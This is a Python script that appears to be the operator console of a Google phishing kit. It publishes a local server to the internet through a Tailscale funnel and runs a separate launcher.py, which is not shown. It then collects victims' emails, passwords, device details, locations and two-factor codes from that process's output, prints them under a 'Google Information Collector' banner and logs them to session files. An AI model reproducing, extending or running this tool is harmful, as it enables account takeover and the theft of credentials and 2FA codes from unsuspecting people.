import subprocess
import time
import sys
import os
import signal
import re
from rich.console import Console
from rich.panel import Panel
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama
init(autoreset=True)
console = Console()
running = True

def handle_exit(sig, frame):
    global running
    console.print("\n[bold red]Shutdown requested. Terminating safely...[/bold red]")
    running = False

signal.signal(signal.SIGINT, handle_exit)

def countdown():
    """Display countdown timer."""
    for i in range(3, -1, -1):
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print(f"\n[bold yellow]Starting in: {i}[/bold yellow]")
        time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')

def reset_tailscale_funnels():
    """Close all open Tailscale funnels."""
    console.print("[bold yellow]Closing existing Tailscale funnels...[/bold yellow]")
    try:
        subprocess.run(
            ["tailscale", "funnel", "reset"],
            check=False,
            capture_output=True,
            text=True
        )
        console.print("[bold green]✓ All funnels closed successfully[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Error closing funnels: {e}[/bold red]")

def get_tailscale_url():
    """Create temporary funnel and get URL."""
    console.print("[bold yellow]Creating temporary funnel to get URL...[/bold yellow]")
    
    process = subprocess.Popen(
        ["tailscale", "funnel", "5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        universal_newlines=True
    )
    
    url = None
    start_time = time.time()
    
    while time.time() - start_time < 15:  # 15 seconds timeout
        line = process.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
            
        if 'https://' in line:
            url = line.strip()
            break
    
    # Kill the temporary funnel
    process.terminate()
    process.wait()
    
    # Reset funnels again
    reset_tailscale_funnels()
    
    return url

def display_banner():
    """Display welcome banner."""
    google_logo = pyfiglet.figlet_format("Google", font="slant")
    os.system('cls' if os.name == 'nt' else 'clear')
    
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    colored_logo = ""
    for i, char in enumerate(google_logo):
        colored_logo += colors[i % len(colors)] + char
    
    print(colored_logo)
    console.print("[bold cyan]Tailscale Funnel Manager[/bold cyan]\n")

def create_session_file():
    """Create a new session file with timestamp."""
    # إنشاء مجلد sessions إذا لم يكن موجوداً
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    # إنشاء اسم الملف بالتاريخ والوقت
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    session_file = f'sessions/session_{timestamp}.txt'
    return session_file

def log_to_session(session_file, message):
    """Log message to session file."""
    with open(session_file, 'a', encoding='utf-8') as f:
        f.write(f"{message}\n")

def run_services():
    """Run launcher.py and Tailscale funnel together."""
    try:
        # إنشاء ملف السجل للجلسة الحالية
        session_file = create_session_file()
        
        # Start launcher.py quietly
        launcher_process = subprocess.Popen(
            [sys.executable, 'launcher.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )

        # Start Tailscale funnel quietly
        funnel_process = subprocess.Popen(
            ["tailscale", "funnel", "5000"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # تخزين المعلومات المجمعة
        collected_info = {
            'emails': [],
            'devices': [],
            'passwords': [],
            'locations': [],
            'codes': []
        }

        # مسح الشاشة وعرض القالب
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # تحضير وحفظ العنوان
        header = f"""{'='*50}
Google Information Collector
{'='*50}

Template:
Email: 
Device: 
Password: 
Location: 
2FA Code: 

{'='*50}

New Information:
"""
        print(f"{Fore.CYAN}{'='*50}")
        print(f"{Fore.BLUE}G{Fore.RED}o{Fore.YELLOW}o{Fore.BLUE}g{Fore.GREEN}l{Fore.RED}e {Fore.RESET}Information Collector")
        print(f"{Fore.CYAN}{'='*50}\n")
        
        print(f"{Fore.YELLOW}Template:{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Email: {Style.RESET_ALL}")
        print(f"{Fore.RED}Device: {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Password: {Style.RESET_ALL}")
        print(f"{Fore.GREEN}Location: {Style.RESET_ALL}")
        print(f"{Fore.RED}2FA Code: {Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"\n{Fore.GREEN}New Information:{Style.RESET_ALL}\n")

        # حفظ العنوان في ملف السجل
        log_to_session(session_file, header)

        # قراءة المخرجات وعرضها مباشرة
        visitor_count = 0
        while launcher_process.poll() is None:
            line = launcher_process.stdout.readline()
            if line:
                line = line.strip()
                
                # تحسين اكتشاف الزوار الجدد
                if any(trigger in line.lower() for trigger in ['new visitor', 'ip address:', 'device info', 'browser:']):
                    visitor_count += 1
                    visitor_msg = f"\n[!] New visitor detected! (Total visitors: {visitor_count})\n"
                    print(f"{Fore.CYAN}{visitor_msg}{Style.RESET_ALL}")
                    log_to_session(session_file, visitor_msg)
                    continue
                
                # معالجة المعلومات المختلفة
                info_msg = None
                if 'Email:' in line:
                    email = line.split('Email:')[1].strip()
                    if email not in collected_info['emails']:
                        collected_info['emails'].append(email)
                        info_msg = f"Email{len(collected_info['emails'])}: {email}"
                        print(f"{Fore.BLUE}{info_msg}{Style.RESET_ALL}")
                elif 'Device:' in line:
                    device = line.split('Device:')[1].strip()
                    if device not in collected_info['devices']:
                        collected_info['devices'].append(device)
                        info_msg = f"Device{len(collected_info['devices'])}: {device}"
                        print(f"{Fore.RED}{info_msg}{Style.RESET_ALL}")
                elif 'Password:' in line:
                    password = line.split('Password:')[1].strip()
                    if password not in collected_info['passwords']:
                        collected_info['passwords'].append(password)
                        info_msg = f"Password{len(collected_info['passwords'])}: {password}"
                        print(f"{Fore.YELLOW}{info_msg}{Style.RESET_ALL}")
                elif 'Location:' in line:
                    location = line.split('Location:')[1].strip()
                    if location not in collected_info['locations']:
                        collected_info['locations'].append(location)
                        info_msg = f"Location{len(collected_info['locations'])}: {location}"
                        print(f"{Fore.GREEN}{info_msg}{Style.RESET_ALL}")
                elif '2FA Code:' in line:
                    code = line.split('2FA Code:')[1].strip()
                    if code not in collected_info['codes']:
                        collected_info['codes'].append(code)
                        info_msg = f"2FA Code{len(collected_info['codes'])}: {code}"
                        print(f"{Fore.RED}{info_msg}{Style.RESET_ALL}")

                # حفظ المعلومات في ملف السجل
                if info_msg:
                    log_to_session(session_file, info_msg)

        launcher_process.wait()
        funnel_process.terminate()
        funnel_process.wait()

    except KeyboardInterrupt:
        # حفظ رسالة الإنهاء
        log_to_session(session_file, "\nSession terminated by user")
        launcher_process.terminate()
        funnel_process.terminate()
        launcher_process.wait()
        funnel_process.wait()
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
        log_to_session(session_file, f"\n{error_msg}")

def main():
    display_banner()
    
    # 1. Reset any existing funnels
    reset_tailscale_funnels()
    
    # 2. Get Tailscale URL temporarily
    url = get_tailscale_url()
    if url:
        console.print(Panel(f"[bold green]Tailscale URL: {url}[/bold green]", 
                          title="Your Link", 
                          border_style="cyan"))
    else:
        console.print("[bold red]Failed to get Tailscale URL[/bold red]")
        return
    
    # 3. Wait for user confirmation
    console.print("\n[bold yellow]Press Enter to start the services...[/bold yellow]")
    input()
    
    # 4. Show countdown
    countdown()
    
    # 5. Run launcher.py and new funnel together with live updates
    run_services()
    
    console.print("[bold green]Program completed successfully![/bold green]")

if __name__ == "__main__":
    main()
